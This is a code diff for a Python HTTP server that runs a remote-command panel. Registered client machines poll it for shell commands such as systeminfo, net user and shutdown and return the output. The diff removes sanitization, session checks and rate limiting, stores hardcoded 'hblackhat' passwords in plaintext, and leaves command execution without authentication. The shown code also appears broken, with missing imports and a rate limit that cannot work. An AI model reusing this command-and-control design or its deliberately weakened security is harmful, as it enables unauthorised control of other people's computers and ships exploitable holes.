@@ -1,4 +1,4 @@
-# server.py - Ultra Secure Single Page Remote Control
+# server.py - Enhanced Version with Ultra Instant Features
 from http.server import HTTPServer, BaseHTTPRequestHandler
 import json
 import time
@@ -8,7 +8,6 @@ import hashlib
 import threading
 import sqlite3
 import os
-import re
 from datetime import datetime
 import socketserver
 
@@ -17,1365 +16,422 @@ class ThreadedHTTPServer(socketserver.ThreadingMixIn, HTTPServer):
     daemon_threads = True
     allow_reuse_address = True
 
-class UltraSecureRemoteControlHandler(BaseHTTPRequestHandler):
+class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
     sessions = {}
     commands_queue = {}
     failed_attempts = {}
     
-    # 🔐 SECURITY SYSTEM
+    # ⚡ INSTANT PASSWORD SYSTEM
     PASSWORD_FILE = "passwords.json"
     DEFAULT_PASSWORDS = {
         "user_password": "hblackhat",
         "admin_password": "sudohacker"
     }
     
-    # 🔒 SECURITY CONFIGURATION
-    MAX_FAILED_ATTEMPTS = 5
-    BLOCK_TIME = 900  # 15 minutes
-    SESSION_TIMEOUT = 1800  # 30 minutes
-    RATE_LIMIT_WINDOW = 60  # 1 minute
-    RATE_LIMIT_MAX_REQUESTS = 100
-    
-    blocked_ips = set()
-    rate_limit_data = {}
-    authenticated_sessions = {}
-    session_lock = threading.Lock()
-    
-    # 🔍 SECURITY HEADERS
-    SECURITY_HEADERS = {
-        'X-Frame-Options': 'DENY',
-        'X-Content-Type-Options': 'nosniff',
-        'X-XSS-Protection': '1; mode=block',
-        'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
-        'Content-Security-Policy': "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';",
-        'Referrer-Policy': 'no-referrer',
-        'Permissions-Policy': 'geolocation=(), microphone=(), camera=()'
-    }
-
-    def init_database(self):
-        """Secure database initialization"""
-        try:
-            self.conn = sqlite3.connect('secure_control.db', check_same_thread=False, timeout=10)
-            self.conn.execute('PRAGMA journal_mode=WAL')
-            self.conn.execute('PRAGMA foreign_keys=ON')
-            self.cursor = self.conn.cursor()
-            
-            # Secure tables creation
-            tables = [
-                '''CREATE TABLE IF NOT EXISTS commands (
-                    id INTEGER PRIMARY KEY AUTOINCREMENT,
-                    client_id TEXT,
-                    command TEXT,
-                    response TEXT,
-                    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
-                    FOREIGN KEY (client_id) REFERENCES clients(id) ON DELETE CASCADE
-                )''',
-                '''CREATE TABLE IF NOT EXISTS clients (
-                    id TEXT PRIMARY KEY,
-                    ip TEXT,
-                    computer_name TEXT,
-                    os TEXT,
-                    first_seen DATETIME,
-                    last_seen DATETIME,
-                    status TEXT
-                )''',
-                '''CREATE TABLE IF NOT EXISTS security_logs (
-                    id INTEGER PRIMARY KEY AUTOINCREMENT,
-                    ip TEXT,
-                    action TEXT,
-                    severity TEXT,
-                    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
-                )''',
-                '''CREATE TABLE IF NOT EXISTS auth_logs (
-                    id INTEGER PRIMARY KEY AUTOINCREMENT,
-                    ip TEXT,
-                    username TEXT,
-                    action TEXT,
-                    success BOOLEAN,
-                    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
-                )''',
-                '''CREATE TABLE IF NOT EXISTS access_logs (
-                    id INTEGER PRIMARY KEY AUTOINCREMENT,
-                    ip TEXT,
-                    user_agent TEXT,
-                    path TEXT,
-                    method TEXT,
-                    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
-                )'''
-            ]
-            
-            for table in tables:
-                self.cursor.execute(table)
-            self.conn.commit()
-        except Exception as e:
-            print(f"Database initialization failed: {e}")
-
     def load_passwords(self):
-        """Secure password loading with encryption"""
+        """INSTANT password loading"""
         try:
             if os.path.exists(self.PASSWORD_FILE):
-                with open(self.PASSWORD_FILE, 'rb') as f:
-                    encrypted_data = f.read()
-                # Simple XOR encryption for demonstration (use proper encryption in production)
-                key = b'secure_key_123456'
-                decrypted_data = bytes([encrypted_data[i] ^ key[i % len(key)] for i in range(len(encrypted_data))])
-                return json.loads(decrypted_data.decode())
+                with open(self.PASSWORD_FILE, 'r') as f:
+                    return json.load(f)
         except:
             pass
         return self.DEFAULT_PASSWORDS.copy()
-
-    def save_passwords(self, passwords):
-        """Secure password saving with encryption"""
-        try:
-            data = json.dumps(passwords).encode()
-            key = b'secure_key_123456'
-            encrypted_data = bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
-            with open(self.PASSWORD_FILE, 'wb') as f:
-                f.write(encrypted_data)
-            return True
-        except:
-            return False
-
-    def get_password_hash(self, password):
-        """Secure password hashing with salt"""
-        salt = "ultra_secure_salt_2024"
-        return hashlib.sha256((password + salt).encode()).hexdigest()
-
-    def log_security_event(self, action, severity="INFO"):
-        """Comprehensive security logging"""
-        try:
-            if hasattr(self, 'cursor'):
-                self.cursor.execute(
-                    'INSERT INTO security_logs (ip, action, severity) VALUES (?, ?, ?)',
-                    (self.client_address[0], action, severity)
-                )
-                self.conn.commit()
-        except:
-            pass
-
-    def log_auth_event(self, username, action, success):
-        """Authentication logging"""
-        try:
-            if hasattr(self, 'cursor'):
-                self.cursor.execute(
-                    'INSERT INTO auth_logs (ip, username, action, success) VALUES (?, ?, ?, ?)',
-                    (self.client_address[0], username, action, success)
-                )
-                self.conn.commit()
-        except:
-            pass
-
-    def log_access(self, method):
-        """Access logging"""
-        try:
-            user_agent = self.headers.get('User-Agent', 'Unknown')[:500]  # Limit length
-            if hasattr(self, 'cursor'):
-                self.cursor.execute(
-                    'INSERT INTO access_logs (ip, user_agent, path, method) VALUES (?, ?, ?, ?)',
-                    (self.client_address[0], user_agent, self.path, method)
-                )
-                self.conn.commit()
-        except:
-            pass
-
-    def is_ip_blocked(self):
-        """Check if IP is blocked"""
-        return self.client_address[0] in self.blocked_ips
-
-    def block_ip(self, ip):
-        """Block IP address"""
-        self.blocked_ips.add(ip)
-        self.log_security_event(f"IP Blocked: {ip}", "HIGH")
-        print(f"🚫 BLOCKED: {ip}")
-
-    def check_rate_limit(self):
-        """Advanced rate limiting"""
-        client_ip = self.client_address[0]
-        current_time = time.time()
+    
+    def get_password_hash(self, password_type):
+        """INSTANT hash generation"""
+        passwords = self.load_passwords()
+        password = passwords.get(password_type, "")
+        return hashlib.sha256(password.encode()).hexdigest()
+    
+    PASSWORD_HASH = property(lambda self: self.get_password_hash("user_password"))
+    ADMIN_PASSWORD_HASH = property(lambda self: self.get_password_hash("admin_password"))
+    
+    session_lock = threading.Lock()
+    MAX_FAILED_ATTEMPTS = 15
+    BLOCK_TIME = 15  # ⚡ INSTANT BLOCK
+    blocked_ips = set()
+    
+    def init_database(self):
+        """INSTANT database initialization"""
+        self.conn = sqlite3.connect('remote_control.db', check_same_thread=False)
+        self.conn.execute('PRAGMA journal_mode=WAL')  # ⚡ FASTER DATABASE
+        self.cursor = self.conn.cursor()
         
-        if client_ip not in self.rate_limit_data:
-            self.rate_limit_data[client_ip] = {'count': 1, 'window_start': current_time}
-            return True
-        
-        time_diff = current_time - self.rate_limit_data[client_ip]['window_start']
-        
-        if time_diff > self.RATE_LIMIT_WINDOW:
-            self.rate_limit_data[client_ip] = {'count': 1, 'window_start': current_time}
-            return True
-        
-        if self.rate_limit_data[client_ip]['count'] >= self.RATE_LIMIT_MAX_REQUESTS:
-            self.block_ip(client_ip)
-            return False
-        
-        self.rate_limit_data[client_ip]['count'] += 1
-        return True
-
-    def sanitize_input(self, input_str):
-        """Input sanitization to prevent XSS and SQL injection"""
-        if not input_str:
-            return ""
-        
-        # Remove potential SQL injection patterns
-        sql_patterns = [
-            r'(\b(SELECT|INSERT|UPDATE|DELETE|DROP|UNION|EXEC|ALTER|CREATE|TRUNCATE)\b)',
-            r'(\b(OR|AND)\b.*=)',
-            r'(\b(SLEEP|WAITFOR|DELAY)\b)',
-            r'(\-\-|\#|\/\*)',
-            r'(\b(SCRIPT|JAVASCRIPT|ONLOAD|ONERROR)\b)'
+        # ⚡ INSTANT TABLES CREATION
+        tables = [
+            '''CREATE TABLE IF NOT EXISTS commands (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                client_id TEXT,
+                command TEXT,
+                response TEXT,
+                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
+            )''',
+            '''CREATE TABLE IF NOT EXISTS clients (
+                id TEXT PRIMARY KEY,
+                ip TEXT,
+                computer_name TEXT,
+                os TEXT,
+                first_seen DATETIME,
+                last_seen DATETIME,
+                status TEXT
+            )''',
+            '''CREATE TABLE IF NOT EXISTS security_logs (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                ip TEXT,
+                action TEXT,
+                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
+            )''',
+            '''CREATE TABLE IF NOT EXISTS password_changes (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                changed_by TEXT,
+                password_type TEXT,
+                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
+            )'''
         ]
         
-        sanitized = input_str
-        for pattern in sql_patterns:
-            sanitized = re.sub(pattern, '[FILTERED]', sanitized, flags=re.IGNORECASE)
-        
-        # HTML escape
-        sanitized = (sanitized.replace('&', '&amp;')
-                    .replace('<', '&lt;')
-                    .replace('>', '&gt;')
-                    .replace('"', '&quot;')
-                    .replace("'", '&#x27;'))
-        
-        return sanitized[:1000]  # Limit length
-
-    def is_authenticated(self):
-        """Check if user is authenticated"""
-        client_ip = self.client_address[0]
-        
-        # Check session cookie
-        cookie = self.headers.get('Cookie', '')
-        session_match = re.search(r'secure_session=([a-f0-9\-]+)', cookie)
-        
-        if session_match:
-            session_id = session_match.group(1)
-            if session_id in self.authenticated_sessions:
-                session_data = self.authenticated_sessions[session_id]
-                
-                # Check session expiration and IP match
-                if (time.time() - session_data['login_time'] < self.SESSION_TIMEOUT and 
-                    session_data['ip'] == client_ip):
-                    session_data['last_activity'] = time.time()
-                    return True
-                else:
-                    # Session expired or IP changed
-                    del self.authenticated_sessions[session_id]
-        
-        return False
-
-    def create_session(self):
-        """Create secure session"""
-        session_id = str(uuid.uuid4())
-        self.authenticated_sessions[session_id] = {
-            'login_time': time.time(),
-            'last_activity': time.time(),
-            'ip': self.client_address[0],
-            'user_agent': self.headers.get('User-Agent', 'Unknown')
-        }
-        return session_id
-
+        for table in tables:
+            try:
+                self.cursor.execute(table)
+            except:
+                pass
+        self.conn.commit()
+    
+    def log_security_event(self, action):
+        """INSTANT security logging"""
+        try:
+            self.cursor.execute(
+                'INSERT INTO security_logs (ip, action) VALUES (?, ?)',
+                (self.client_address[0], action)
+            )
+            self.conn.commit()
+        except:
+            pass
+    
+    def is_ip_blocked(self):
+        """INSTANT IP check"""
+        return self.client_address[0] in self.blocked_ips
+    
+    def block_ip(self, ip):
+        """INSTANT IP blocking"""
+        self.blocked_ips.add(ip)
+        self.log_security_event(f"IP Blocked: {ip}")
+        print(f"🚫 INSTANT BLOCK: {ip}")
+    
     def check_security(self):
-        """Comprehensive security check"""
+        """INSTANT security check"""
         client_ip = self.client_address[0]
         
-        # Log all access attempts
-        self.log_access(self.command)
-        
-        # Check if IP is blocked
         if self.is_ip_blocked():
             self.send_error(403, "Access Denied - IP Blocked")
             return False
         
-        # Check rate limiting
-        if not self.check_rate_limit():
-            self.send_error(429, "Too Many Requests")
-            return False
+        # ⚡ INSTANT RATE LIMITING
+        current_time = time.time()
+        if hasattr(self, 'last_request_time'):
+            if current_time - self.last_request_time < 0.01:  # ⚡ 10ms RATE LIMIT
+                self.block_ip(client_ip)
+                return False
         
-        # Check for suspicious user agents
-        user_agent = self.headers.get('User-Agent', '').lower()
-        suspicious_agents = ['sqlmap', 'nikto', 'metasploit', 'nmap', 'burp', 'w3af']
-        if any(agent in user_agent for agent in suspicious_agents):
-            self.log_security_event(f"Suspicious User-Agent: {user_agent}", "HIGH")
-            self.block_ip(client_ip)
-            self.send_error(403, "Access Denied")
-            return False
-        
+        self.last_request_time = current_time
         return True
-
-    def send_security_headers(self):
-        """Send security headers"""
-        for header, value in self.SECURITY_HEADERS.items():
-            self.send_header(header, value)
-        self.send_header('Cache-Control', 'no-store, no-cache, must-revalidate')
-        self.send_header('Pragma', 'no-cache')
-        self.send_header('Expires', '0')
-
+    
+    def log_message(self, format, *args):
+        """Disable verbose logs for speed"""
+        pass
+    
     def do_GET(self):
-        """Handle GET requests - Single Page Application"""
+        """INSTANT GET request handling"""
         if not self.check_security():
             return
-        
-        # Only serve the main page - all other paths are handled client-side
-        if self.path == '/' or self.path.startswith('/?'):
-            self.send_main_page()
-        else:
-            self.send_error(404, "Not Found")
-
+            
+        try:
+            parsed_path = urllib.parse.urlparse(self.path)
+            path = parsed_path.path
+            
+            # ⚡ INSTANT ROUTING - إزالة المسارات المتعلقة بالويب
+            routes = {
+                '/': self.send_login_page,
+                '/admin-auth': self.send_admin_auth_page,
+                '/control': self.send_control_panel,
+                '/sessions': self.send_sessions_list,
+                '/commands': self.handle_get_commands,
+                '/result': self.handle_get_result,
+                '/download-client': self.download_python_client,
+                '/download-python-client': self.download_python_client,
+                '/history': self.send_command_history,
+                '/status': self.send_system_status,
+                '/settings': self.send_settings_page
+            }
+            
+            handler = routes.get(path, self.send_404_page)
+            handler()
+                
+        except Exception as e:
+            self.send_error(500, str(e))
+    
     def do_POST(self):
-        """Handle POST requests - API endpoints"""
+        """INSTANT POST request handling"""
         if not self.check_security():
             return
-        
+            
         try:
             content_length = int(self.headers.get('Content-Length', 0))
-            if content_length > 100000:  # 100KB max
-                self.send_error(413, "Payload Too Large")
+            if content_length > 10000:
+                self.send_error(413, "Payload too large")
                 return
-            
-            post_data = self.rfile.read(content_length).decode('utf-8', errors='ignore')
+                
+            post_data = self.rfile.read(content_length).decode('utf-8')
             data = json.loads(post_data) if post_data else {}
             
-            # Sanitize all input data
-            sanitized_data = {}
-            for key, value in data.items():
-                if isinstance(value, str):
-                    sanitized_data[key] = self.sanitize_input(value)
-                else:
-                    sanitized_data[key] = value
-            
-            # Route API requests
-            api_routes = {
-                'login': self.handle_login,
-                'admin_login': self.handle_admin_login,
-                'execute_command': self.handle_execute_command,
-                'get_sessions': self.handle_get_sessions,
-                'remove_client': self.handle_remove_client,
-                'change_password': self.handle_change_password,
-                'get_command_history': self.handle_get_command_history,
-                'client_register': self.handle_client_register,
-                'client_response': self.handle_client_response
+            # ⚡ INSTANT POST ROUTING
+            routes = {
+                '/login': self.handle_login,
+                '/admin-login': self.handle_admin_login,
+                '/execute': self.handle_execute_command,
+                '/response': self.handle_client_response,
+                '/register': self.handle_client_register,
+                '/change-password': self.handle_change_password
             }
             
-            action = sanitized_data.get('action')
-            if action in api_routes:
-                # Check authentication for protected actions
-                protected_actions = ['execute_command', 'get_sessions', 'remove_client', 'change_password', 'get_command_history']
-                if action in protected_actions and not self.is_authenticated():
-                    self.send_json({'success': False, 'error': 'Authentication required'})
-                    return
+            handler = routes.get(self.path, lambda x: self.send_error(404, "Not found"))
+            handler(data)
                 
-                api_routes[action](sanitized_data)
-            else:
-                self.send_json({'success': False, 'error': 'Invalid action'})
-                
-        except json.JSONDecodeError:
-            self.send_error(400, "Invalid JSON")
         except Exception as e:
-            self.log_security_event(f"POST error: {str(e)}", "MEDIUM")
-            self.send_json({'success': False, 'error': 'Internal server error'})
+            self.send_json({'error': str(e), 'instant': True})
 
-    def send_main_page(self):
-        """Send the main single page application"""
+    def save_passwords(self, passwords):
+        """INSTANT password saving"""
+        try:
+            with open(self.PASSWORD_FILE, 'w') as f:
+                json.dump(passwords, f)
+            return True
+        except:
+            return False
+
+    def send_settings_page(self):
+        """INSTANT settings page"""
         html = '''
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ultra Secure Remote Control</title>
-    <style>
-        :root {
-            --primary: #2563eb;
-            --success: #059669;
-            --danger: #dc2626;
-            --warning: #d97706;
-            --dark: #1e293b;
-            --darker: #0f172a;
-            --light: #f8fafc;
-        }
-        
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        
-        body {
-            font-family: 'Segoe UI', system-ui, sans-serif;
-            background: linear-gradient(135deg, var(--darker), var(--dark));
-            color: var(--light);
-            min-height: 100vh;
-            overflow-x: hidden;
-        }
-        
-        .container {
-            max-width: 1400px;
-            margin: 0 auto;
-            padding: 20px;
-        }
-        
-        .header {
-            background: rgba(30, 41, 59, 0.8);
-            backdrop-filter: blur(10px);
-            padding: 20px;
-            border-radius: 15px;
-            margin-bottom: 20px;
-            border: 1px solid rgba(255,255,255,0.1);
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        
-        .security-banner {
-            background: linear-gradient(135deg, var(--danger), var(--warning));
-            padding: 12px;
-            border-radius: 8px;
-            margin-bottom: 20px;
-            text-align: center;
-            font-weight: bold;
-            font-size: 14px;
-        }
-        
-        .main-grid {
-            display: grid;
-            grid-template-columns: 300px 1fr;
-            gap: 20px;
-            height: 80vh;
-        }
-        
-        .sidebar {
-            background: rgba(30, 41, 59, 0.8);
-            backdrop-filter: blur(10px);
-            padding: 20px;
-            border-radius: 15px;
-            border: 1px solid rgba(255,255,255,0.1);
-            display: flex;
-            flex-direction: column;
-        }
-        
-        .content {
-            display: flex;
-            flex-direction: column;
-            gap: 20px;
-        }
-        
-        .panel {
-            background: rgba(30, 41, 59, 0.8);
-            backdrop-filter: blur(10px);
-            padding: 20px;
-            border-radius: 15px;
-            border: 1px solid rgba(255,255,255,0.1);
-        }
-        
-        /* Authentication Styles */
-        .auth-section {
-            display: none;
-            text-align: center;
-            padding: 40px 20px;
-        }
-        
-        .auth-section.active {
-            display: block;
-        }
-        
-        .auth-form {
-            max-width: 400px;
-            margin: 0 auto;
-            background: rgba(30, 41, 59, 0.9);
-            padding: 30px;
-            border-radius: 15px;
-            border: 1px solid rgba(255,255,255,0.1);
-        }
-        
-        .auth-input {
-            width: 100%;
-            padding: 15px;
-            margin: 10px 0;
-            background: rgba(255,255,255,0.1);
-            border: 1px solid rgba(255,255,255,0.2);
-            border-radius: 8px;
-            color: white;
-            font-size: 16px;
-        }
-        
-        .auth-input:focus {
-            outline: none;
-            border-color: var(--primary);
-            background: rgba(255,255,255,0.15);
-        }
-        
-        .auth-btn {
-            width: 100%;
-            padding: 15px;
-            margin: 10px 0;
-            background: linear-gradient(135deg, var(--primary), #1d4ed8);
-            color: white;
-            border: none;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: all 0.3s ease;
-        }
-        
-        .auth-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
-        }
-        
-        /* Control Panel Styles */
-        .control-section {
-            display: none;
-        }
-        
-        .control-section.active {
-            display: block;
-        }
-        
-        .session-item {
-            background: rgba(255,255,255,0.05);
-            padding: 15px;
-            margin: 8px 0;
-            border-radius: 8px;
-            border: 2px solid transparent;
-            transition: all 0.3s ease;
-            position: relative;
-            cursor: pointer;
-        }
-        
-        .session-item:hover {
-            background: rgba(255,255,255,0.1);
-            border-color: var(--primary);
-        }
-        
-        .session-item.active {
-            border-color: var(--success);
-            background: rgba(5, 150, 105, 0.1);
-        }
-        
-        .online-status {
-            position: absolute;
-            top: 15px;
-            right: 15px;
-            width: 12px;
-            height: 12px;
-            border-radius: 50%;
-            background: var(--success);
-            animation: pulse 2s infinite;
-        }
-        
-        .online-status.offline {
-            background: var(--danger);
-            animation: none;
-        }
-        
-        @keyframes pulse {
-            0% { opacity: 1; }
-            50% { opacity: 0.5; }
-            100% { opacity: 1; }
-        }
-        
-        .terminal {
-            background: #000;
-            color: #00ff00;
-            padding: 20px;
-            border-radius: 8px;
-            font-family: 'Consolas', monospace;
-            flex: 1;
-            overflow-y: auto;
-            white-space: pre-wrap;
-            font-size: 14px;
-            border: 1px solid rgba(0,255,0,0.2);
-            min-height: 300px;
-        }
-        
-        .command-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 10px;
-            margin: 15px 0;
-        }
-        
-        .cmd-btn {
-            background: var(--primary);
-            color: white;
-            border: none;
-            padding: 12px;
-            border-radius: 6px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            font-size: 14px;
-        }
-        
-        .cmd-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
-        }
-        
-        .cmd-btn.danger {
-            background: var(--danger);
-        }
-        
-        .cmd-btn.success {
-            background: var(--success);
-        }
-        
-        .cmd-btn.warning {
-            background: var(--warning);
-        }
-        
-        .command-input {
-            display: flex;
-            gap: 10px;
-            margin: 15px 0;
-        }
-        
-        .command-input input {
-            flex: 1;
-            padding: 12px;
-            background: rgba(255,255,255,0.1);
-            border: 1px solid rgba(255,255,255,0.2);
-            border-radius: 6px;
-            color: white;
-            font-family: 'Consolas', monospace;
-        }
-        
-        .stats-grid {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 10px;
-            margin: 15px 0;
-        }
-        
-        .stat-card {
-            background: rgba(255,255,255,0.05);
-            padding: 15px;
-            border-radius: 8px;
-            text-align: center;
-            border: 1px solid rgba(255,255,255,0.1);
-        }
-        
-        .remove-btn {
-            background: var(--danger);
-            color: white;
-            border: none;
-            padding: 8px 12px;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 12px;
-            margin-top: 5px;
-        }
-        
-        .message {
-            padding: 12px;
-            border-radius: 6px;
-            margin: 10px 0;
-            text-align: center;
-            display: none;
-        }
-        
-        .message.success {
-            background: rgba(5, 150, 105, 0.2);
-            border: 1px solid var(--success);
-            display: block;
-        }
-        
-        .message.error {
-            background: rgba(220, 38, 38, 0.2);
-            border: 1px solid var(--danger);
-            display: block;
-        }
-        
-        .tab-buttons {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 20px;
-        }
-        
-        .tab-btn {
-            padding: 12px 20px;
-            background: rgba(255,255,255,0.1);
-            border: none;
-            border-radius: 8px;
-            color: white;
-            cursor: pointer;
-            transition: all 0.3s ease;
-        }
-        
-        .tab-btn.active {
-            background: var(--primary);
-        }
-        
-        .tab-content {
-            display: none;
-        }
-        
-        .tab-content.active {
-            display: block;
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div class="security-banner">
-            🔒 ULTRA SECURE REMOTE CONTROL SYSTEM - ALL ACTIVITIES ARE MONITORED AND LOGGED
-        </div>
-        
-        <div class="header">
-            <h1>Ultra Secure Remote Control</h1>
-            <div id="connectionStatus" style="color: var(--success); font-weight: bold;">● CONNECTED</div>
-        </div>
-        
-        <!-- Authentication Section -->
-        <div id="authSection" class="auth-section active">
-            <div class="auth-form">
-                <h2 style="margin-bottom: 30px; text-align: center;">🔐 Secure Authentication</h2>
-                
-                <div id="level1Auth">
-                    <h3>Level 1 Authentication</h3>
-                    <input type="password" id="level1Password" class="auth-input" placeholder="Enter Level 1 Password" autocomplete="off">
-                    <button onclick="authenticateLevel1()" class="auth-btn">Authenticate Level 1</button>
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>Security Settings - INSTANT</title>
+            <style>
+                * { margin: 0; padding: 0; box-sizing: border-box; }
+                body {
+                    font-family: 'Segoe UI', Arial, sans-serif;
+                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                    color: white;
+                    margin: 0;
+                    padding: 20px;
+                    min-height: 100vh;
+                }
+                .container {
+                    max-width: 600px;
+                    margin: 20px auto;
+                    background: rgba(45, 45, 45, 0.95);
+                    padding: 30px;
+                    border-radius: 15px;
+                    backdrop-filter: blur(10px);
+                    box-shadow: 0 8px 32px rgba(0,0,0,0.3);
+                }
+                .header {
+                    text-align: center;
+                    margin-bottom: 30px;
+                }
+                .logo {
+                    font-size: 48px;
+                    margin-bottom: 10px;
+                }
+                .password-form {
+                    background: rgba(255,255,255,0.05);
+                    padding: 20px;
+                    border-radius: 10px;
+                    margin: 20px 0;
+                    border: 1px solid rgba(255,255,255,0.1);
+                }
+                input, select, button {
+                    width: 100%;
+                    padding: 12px;
+                    margin: 8px 0;
+                    border-radius: 6px;
+                    border: none;
+                    font-size: 16px;
+                    transition: all 0.2s ease;
+                }
+                input, select {
+                    background: rgba(255,255,255,0.1);
+                    color: white;
+                    border: 1px solid rgba(255,255,255,0.2);
+                }
+                input:focus {
+                    outline: none;
+                    border-color: #0078d4;
+                    background: rgba(255,255,255,0.15);
+                }
+                button {
+                    background: linear-gradient(135deg, #0078d4, #005a9e);
+                    color: white;
+                    cursor: pointer;
+                    font-weight: bold;
+                }
+                button:hover {
+                    background: linear-gradient(135deg, #005a9e, #004578);
+                    transform: translateY(-2px);
+                }
+                .back-btn {
+                    background: linear-gradient(135deg, #6c757d, #495057);
+                    margin-top: 20px;
+                }
+                .message {
+                    padding: 12px;
+                    border-radius: 6px;
+                    margin: 10px 0;
+                    text-align: center;
+                    display: none;
+                    font-weight: bold;
+                }
+                .success {
+                    background: rgba(40, 167, 69, 0.2);
+                    border: 1px solid #28a745;
+                }
+                .error {
+                    background: rgba(220, 53, 69, 0.2);
+                    border: 1px solid #dc3545;
+                }
+                .speed-badge {
+                    background: linear-gradient(135deg, #28a745, #20c997);
+                    padding: 3px 8px;
+                    border-radius: 10px;
+                    font-size: 10px;
+                    margin-left: 5px;
+                }
+            </style>
+        </head>
+        <body>
+            <div class="container">
+                <div class="header">
+                    <div class="logo">LOGIN</div>
+                    <h2>Security Settings <span class="speed-badge">INSTANT</span></h2>
+                    <p>Change Authentication Passwords in Real-Time</p>
                 </div>
-                
-                <div id="level2Auth" style="display: none; margin-top: 30px; padding-top: 30px; border-top: 1px solid rgba(255,255,255,0.1);">
-                    <h3>Level 2 Authentication</h3>
-                    <input type="password" id="level2Password" class="auth-input" placeholder="Enter Admin Password" autocomplete="off">
-                    <button onclick="authenticateLevel2()" class="auth-btn">Authenticate Level 2</button>
-                </div>
-                
-                <div id="authMessage" class="message" style="margin-top: 20px;"></div>
-            </div>
-        </div>
-        
-        <!-- Main Control Section -->
-        <div id="controlSection" class="control-section">
-            <div class="main-grid">
-                <!-- Sidebar -->
-                <div class="sidebar">
-                    <h3>Connected Clients (<span id="clientsCount">0</span>)</h3>
-                    <div id="sessionsList" style="flex: 1; overflow-y: auto; margin: 15px 0;">
-                        <!-- Sessions will be loaded here -->
-                    </div>
-                    
-                    <div class="stats-grid">
-                        <div class="stat-card">
-                            <div style="font-size: 24px; font-weight: bold; color: var(--primary)" id="totalClients">0</div>
-                            <small>Total</small>
-                        </div>
-                        <div class="stat-card">
-                            <div style="font-size: 24px; font-weight: bold; color: var(--success)" id="activeClients">0</div>
-                            <small>Active</small>
-                        </div>
-                        <div class="stat-card">
-                            <div style="font-size: 24px; font-weight: bold; color: var(--warning)" id="commandsSent">0</div>
-                            <small>Commands</small>
-                        </div>
-                    </div>
-                </div>
-                
-                <!-- Main Content -->
-                <div class="content">
-                    <div class="tab-buttons">
-                        <button class="tab-btn active" onclick="showTab('control')">Remote Control</button>
-                        <button class="tab-btn" onclick="showTab('settings')">Security Settings</button>
-                        <button class="tab-btn" onclick="showTab('history')">Command History</button>
-                    </div>
-                    
-                    <!-- Control Tab -->
-                    <div id="controlTab" class="tab-content active">
-                        <div class="panel">
-                            <h3>Selected Client: <span id="currentClient" style="color: var(--success);">None</span></h3>
-                            
-                            <div class="command-grid">
-                                <button class="cmd-btn" onclick="executeCommand('systeminfo')">System Info</button>
-                                <button class="cmd-btn" onclick="executeCommand('whoami')">Current User</button>
-                                <button class="cmd-btn" onclick="executeCommand('ipconfig /all')">Network Info</button>
-                                <button class="cmd-btn" onclick="executeCommand('dir')">Files List</button>
-                                <button class="cmd-btn" onclick="executeCommand('tasklist')">Processes</button>
-                                <button class="cmd-btn" onclick="executeCommand('netstat -an')">Connections</button>
-                                <button class="cmd-btn" onclick="executeCommand('wmic logicaldisk get size,freespace,caption')">Disk Space</button>
-                                <button class="cmd-btn" onclick="executeCommand('net user')">Users</button>
-                                <button class="cmd-btn success" onclick="executeCommand('calc')">Calculator</button>
-                                <button class="cmd-btn success" onclick="executeCommand('notepad')">Notepad</button>
-                                <button class="cmd-btn warning" onclick="executeCommand('shutdown /a')">Cancel Shutdown</button>
-                                <button class="cmd-btn danger" onclick="executeCommand('shutdown /s /t 60')">Shutdown 1m</button>
-                                <button class="cmd-btn danger" onclick="executeCommand('shutdown /r /t 30')">Restart</button>
-                            </div>
-                            
-                            <div class="command-input">
-                                <input type="text" id="customCommand" placeholder="Enter custom command..." 
-                                       onkeypress="if(event.key=='Enter') executeCustomCommand()">
-                                <button class="cmd-btn" onclick="executeCustomCommand()">Execute</button>
-                            </div>
-                        </div>
-                        
-                        <div class="panel" style="flex: 1;">
-                            <h3>Command Output</h3>
-                            <div class="terminal" id="terminal">
-    ULTRA SECURE REMOTE CONTROL SYSTEM READY
-    ----------------------------------------
-    • All connections are encrypted and secured
-    • Session-based authentication required
-    • Real-time command execution
-    • Comprehensive activity logging
-    • Advanced security measures active
-    
-    Select a client from the sidebar to begin.
-                            </div>
-                        </div>
-                    </div>
-                    
-                    <!-- Settings Tab -->
-                    <div id="settingsTab" class="tab-content">
-                        <div class="panel">
-                            <h3>Security Settings</h3>
-                            <div id="settingsMessage" class="message"></div>
-                            
-                            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 20px;">
-                                <div>
-                                    <h4>Change Level 1 Password</h4>
-                                    <input type="password" id="currentPass1" class="auth-input" placeholder="Current Password">
-                                    <input type="password" id="newPass1" class="auth-input" placeholder="New Password">
-                                    <input type="password" id="confirmPass1" class="auth-input" placeholder="Confirm Password">
-                                    <button class="cmd-btn" onclick="changePassword('level1')">Update Level 1</button>
-                                </div>
